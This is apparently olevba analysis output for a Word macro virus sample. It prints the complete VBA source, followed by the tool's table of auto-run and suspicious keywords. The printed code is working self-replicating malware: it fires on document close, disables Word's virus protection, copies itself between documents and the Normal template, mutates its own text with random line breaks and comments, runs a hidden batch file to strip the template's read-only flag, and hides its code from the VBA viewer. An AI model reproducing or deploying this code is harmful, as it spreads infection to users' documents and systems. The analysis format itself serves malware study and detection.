olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.m-5709c5d8d7db934096ccc529477da462d5fe9716
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.m-5709c5d8d7db934096ccc529477da462d5fe9716 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
            Private Sub _
Document_Close()

         On Error GoTo _
skam

    Options.VirusProtection _
= False

    SWL
'40,13744
          ABS99
'41,27668
skam:
'58,3359
         End Sub
'91,93771
   Private Sub Čäĺíňčôčęŕňîđ()
'47,44592
 End Sub
'39,04715
           Private Sub Document_New()
'8,964139
  End Sub
'58,97926
    Sub Claudio()
'79,01289
           On Error _
GoTo skam

  Options.VirusProtection = False
'69,52818
        SWL
'81,46639
          ABS99
'48,98304
skam:
'15,03113
           End Sub
'68,40623
        Private Sub SWL()
'53,30223
      Application. _
                                        ShowVisualBasicEditor = False

      If Not ActiveDocument.VBProject. _
                VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

    For I = 1 To NormalTemplate.VBProject. _
                VBComponents(1).CodeModule.CountOfLines

     d = NormalTemplate.VBProject. _
                VBComponents(1).CodeModule.Lines(I, 1)

             If Len(d) > _
0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While Mid(d, Len(d) - _
1, 2) = " _"

  I = I _
+ 1

  d = Left(d, Len(d) _
- 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  Wend
'72,94109
            d = e(d)
'55,51133
            ActiveDocument. _
               VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

          End If
'33,90907
    Next _
I

           ActiveDocument. _
                                                    SaveAs AddToRecentFiles:=False

     End If
'28,13814
       End Sub
'26,80438
  Private Sub ABS99()
'1,88089
           If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

f _
(NormalTemplate.FullName)

    For _
I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

          d = _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

              If Len(d) > 0 And _
Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

         While Mid(d, Len(d) _
- 1, 2) = " _"

           I _
= I + 1

     d = Left(d, Len(d) - 1) & _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

Wend
'13,9438
  d = _
e(d)

      NormalTemplate. _
                  VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

  End _
If

    Next _
I

              NormalTemplate. _
                       Save

         End If
'31,85893
       End Sub
'54,973
Private _
Function e(aString) As String

          aString _
= LTrim(aString)

 aString = RTrim(aString)
'62,66841
              If aString = "Sub " & "Vc()" Then
'64,51331
aString = "Sub " & "ViewVBCode()"
'36,72802
    Else
'45,12395
         If _
aString = "Sub " & "ViewVBCode()" Then

              aString = "Sub " & "Vc()"
'13,31551
           End If
'73,81237
End _
If

    For I _
= 1 To Len(aString) - 1

        If Mid(aString, _
I, 1) = "." Then

     If _
Not Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

     If Not Mid(aString, _
I + 1, 1) = Chr$(34) Then

         e = _
Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

    For j = 1 To _
Int(15 * Rnd)

       e _
= " " & e

              Next j
'24,41467
        Exit _
Function

End If
'10,01976
             End _
If

 Else
'6,855148
             If Mid(aString, _
I, 1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

If Not _
Mid(aString, I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

      e _
= Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

  For _
j = 1 To Int(15 * Rnd)

             e = " " & e
'46,29713
            Next _
j

             Exit _
Function

           End _
If

             End _
If

              End _
If

            Next I
'57,9242
     e = aString _
& Chr$(13) & "'" & (100 * Rnd)

           Count = Int(15 _
* Rnd)

         For _
j = 1 To Count

   e = " " & e
'89,7287
            Next j
'26,29248
         End _
Function

             Private _
Sub f(fName)

           If GetAttr(fName) _
And vbReadOnly Then

          Open Dir(fName) & ".bat" For Append As #1
'23,9589
    Print #1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)
'75,68592
 Print _
#1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

       Close #1
'38,45152
     shellResult = Shell(Dir(fName) _
& ".bat", vbHide)

  End If
'24,6076
           End Sub
'77,10418
          Sub ViewVBCode()
'8,080805
       For _
aDoc = 1 To Documents.Count

       For I _
= 1 To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

 Documents(aDoc). _
        VBProject.VBComponents(1).CodeModule.DeleteLines 1

        Next I
'63,2898
           Next aDoc
'84,91542
       For _
I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

      NormalTemplate.VBProject. _
            VBComponents(1).CodeModule.DeleteLines 1

 Next _
I

           Application.ShowVisualBasicEditor _
= True

              End _
Sub

  Private _
Sub Document_Open()

           End Sub
'65,99275
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

